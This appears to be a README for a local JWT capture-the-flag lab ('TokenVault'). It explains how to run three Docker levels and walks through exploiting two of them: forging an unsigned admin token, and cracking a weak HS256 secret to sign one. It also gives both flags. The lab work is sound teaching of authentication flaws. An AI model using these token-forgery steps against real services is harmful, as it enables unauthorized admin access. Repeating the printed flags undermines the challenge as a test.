# How to Run – TokenVault JWT CTF Challenges

**Complete Step-by-Step Guide (Simple Language)**

This guide tells you everything you need to know to get all three challenge levels running on your computer, and how to exploit Levels 1 and 2.

---

## What You Need Before Starting

You only need one thing installed:

- **Docker Desktop** — Download from https://www.docker.com/products/docker-desktop/
  - After installing, open it and make sure it's running (you'll see the whale icon in your taskbar)
  - You don't need to sign in or do anything else in Docker Desktop — just make sure it's open

You do **not** need Node.js, npm, or anything else installed on your computer. Docker handles everything.

---

## Step 1 – Open a Terminal

On Windows:
- Press `Win + R`, type `cmd`, and press Enter
- Or right-click the Start button → "Terminal"

On Mac:
- Press `Cmd + Space`, type "Terminal", press Enter

---

## Step 2 – Navigate to the Project Folder

In your terminal, type (adjust the path to wherever you saved this project):

```bash
cd path/to/jwt-ctf
```

For example:
```bash
cd C:\Users\YourName\Documents\jwt-ctf
```

---

## Running Level 1 (No JWT Verification)

Open a terminal and go to the level1 folder:

```bash
cd challenges/level1
```

Build the Docker image (this downloads and installs everything — takes ~1 minute the first time):
```bash
docker build -t tokenvault-level1 .
```

Run the container:
```bash
docker run -p 3001:3000 tokenvault-level1
```

You'll see:
```
  ╔══════════════════════════════════════════════╗
  ║         TokenVault – Level 1                 ║
  ║   ⚠️  VULNERABLE: No JWT Verification        ║
  ║   Running on http://localhost:3000           ║
  ╚══════════════════════════════════════════════╝
```

Now open your browser and go to: **http://localhost:3001**

**To stop it:** Press `Ctrl + C` in the terminal.

---

## Running Level 2 (Weak Secret Key)

Open a **new** terminal tab/window and go to the level2 folder:

```bash
cd challenges/level2
docker build -t tokenvault-level2 .
docker run -p 3002:3000 tokenvault-level2
```

Open your browser and go to: **http://localhost:3002**

---

## Running Level 3 (Fully Secure)

Open a **new** terminal tab/window and go to the level3 folder:

```bash
cd challenges/level3
docker build -t tokenvault-level3 .
docker run -p 3003:3000 tokenvault-level3
```

Open your browser and go to: **http://localhost:3003**

---

## All Three Levels at the Same Time

You can run all three simultaneously in separate terminal windows:

| Level | Terminal | URL |
|-------|----------|-----|
| Level 1 | `cd challenges/level1 && docker run -p 3001:3000 tokenvault-level1` | http://localhost:3001 |
| Level 2 | `cd challenges/level2 && docker run -p 3002:3000 tokenvault-level2` | http://localhost:3002 |
| Level 3 | `cd challenges/level3 && docker run -p 3003:3000 tokenvault-level3` | http://localhost:3003 |

---

## How to Exploit Level 1 (Step by Step)

**Vulnerability: The server never checks the JWT signature**

1. Open **http://localhost:3001** in your browser

2. Log in with:
   - Username: `alice`
   - Password: `password123`

3. You'll see your JWT token appear on screen. Copy the middle part (the **Payload** — highlighted in green)

4. Decode it using Base64. You can do this in your browser console (press F12):
   ```javascript
   atob("paste-the-green-middle-part-here")
   ```
   You'll see: `{"username":"alice","role":"user","iat":...,"exp":...}`

5. Now change `"role":"user"` to `"role":"admin"` in that JSON

6. Re-encode your new payload:
   ```javascript
   btoa('{"username":"alice","role":"admin","iat":1712000000,"exp":9999999999}')
   ```
   Fix any `=` padding if needed (remove trailing `=` signs from the result)

7. Build your new token: `ORIGINAL_HEADER.YOUR_NEW_PAYLOAD.anything`
   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.YOUR_NEW_PAYLOAD_HERE.FAKESIG
   ```

8. Paste this into the **"Custom Token"** box on the page

9. Click **"Admin Panel (custom token)"**

10. You get the flag: `CTF{jwt_n0_v3r1fy_4lw4ys_trust_n3v3r}` 🎉

---

## How to Exploit Level 2 (Step by Step)

**Vulnerability: JWT is verified, but the secret key is "secret" (easily cracked)**

**Part A – Get a token:**

1. Open **http://localhost:3002**, log in as `alice` / `password123`

2. Copy the full token from the display

**Part B – Crack the secret:**

You need Node.js for this part. Check if you have it:
```bash
node --version
```

If not installed, download from https://nodejs.org/ (LTS version)

Install jwt-cracker:
```bash
npm install -g jwt-cracker
```

Run the cracker (paste your token):
```bash
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.YOURTOKEN..." --alphabet "abcdefghijklmnopqrstuvwxyz"
```

Output:
```
[+] SECRET FOUND: secret
```

**Part C – Forge an admin token:**

```bash
node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({username:'hacker',role:'admin'},'secret',{algorithm:'HS256'}))"
```

Note: If `jsonwebtoken` isn't installed globally, cd into any level folder and run the command from there (it's in the local `node_modules` after building).

**Part D – Use the forged token:**

1. Copy the output token
2. Go to **http://localhost:3002**
3. Log in as alice first so the interface shows
4. Paste your forged token into the **"Forged Admin Token"** box
5. Click **"Admin Panel (forged token)"**
6. You get the flag: `CTF{w34k_s3cr3t_1s_n0_s3cr3t_4t_4ll}` 🎉

---

## Troubleshooting

**"docker: command not found"**  
→ Docker Desktop is not installed or not running. Install it from https://www.docker.com

**"Port already in use"**  
→ You already have something running on that port. Either stop the other container, or change the port:
```bash
docker run -p 4001:3000 tokenvault-level1   # Use port 4001 instead
```
Then visit http://localhost:4001

**"npm: command not found" when trying jwt-cracker**  
→ Node.js is not installed. Download from https://nodejs.org

**The page shows "Cannot GET /"**  
→ Make sure you ran `docker build` before `docker run`. Try rebuilding:
```bash
docker build --no-cache -t tokenvault-level1 .
docker run -p 3001:3000 tokenvault-level1
```

**Container keeps stopping immediately**  
→ Check for errors by running without the `-d` flag (which you aren't using anyway). Read the output in the terminal for error messages.

---

## Stopping / Cleaning Up

To stop a running container: press `Ctrl + C` in the terminal where it's running.

To remove all built images after you're done:
```bash
docker rmi tokenvault-level1 tokenvault-level2 tokenvault-level3
```
